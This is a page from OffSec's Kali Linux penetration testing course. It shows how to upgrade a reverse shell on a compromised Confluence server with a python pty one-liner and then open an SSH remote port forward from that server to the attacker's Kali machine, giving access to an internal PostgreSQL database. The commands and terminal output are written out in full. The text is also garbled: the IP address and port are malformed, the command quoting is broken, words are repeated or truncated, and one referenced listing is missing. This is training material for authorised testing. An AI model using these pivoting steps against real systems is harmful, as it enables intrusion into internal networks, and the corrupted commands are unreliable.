# OffSec

Penetration Testing with Kali Linux

Once we have a reverse shell from CONFLUENCE01, we we have a TTY shell, then we SSH remote port forward back to our Kali machine.

In order to connect to the Kali SSH server using a username and password you may have to explicitly allow password-based authentication by setting PasswordAuthentication yes in /etc/ssh/sshd_config.

The SSH remote port forward option is -R, and has a very similar syntax to the local port forward option. It also takes two sockets as the argument. The listening socket is defined first, and the forwarding socket is second.

In this case, we want to listen on port 2345 on our Kali machine (127.0.0.1:2345), and forward all traffic to the PostgreSQL server on PGDATABASE01 (10.4.20.15342).

```
confluence01:/opt/atlassian/confluence/bin python3 -c import pty; pty.spawn("/bin/bash") '
<python3 -c import pty; pty.spawn("/bin/bash") 
confluence01:/opt/atlassian/confluence/bin ssh -N -R 
127.0.0.1:2345:10.4.20.15342 kali@192.168.118.184 
< 127.0.0.1:2345:10.4.20.15342 kali@192.168.118.184 
Could not create directory '/home/confluence/.ssh'.
The authenticity of '192.168.118.184' can't be established.
ECDSA key fingerprint is SHA256:A07q7ZliP99m8eohfbV6JX/ISh7HjY2bffMFFn0.
Are sure you want to continue connecting (no/yes)? yes
Failed to add to the list of known hosts (/home/confluence/known_hosts)
kali@192.168.118.184:password:
```

> Listing 547 - The SSH remote port forward being set up, connecting to the Kali machine

We can confirm that our remote port forward is listening by checking if port 2345 is open on our Kali loopback interface.

> Listing 548 - Checking if port 2345 is bound on the Kali server.

It! Our port forward is now set up as intended, with the SSH port forward command running on CONFLU01.

PWK - Copyright © 2023 OffSec Services Limited. All rights reserved.

591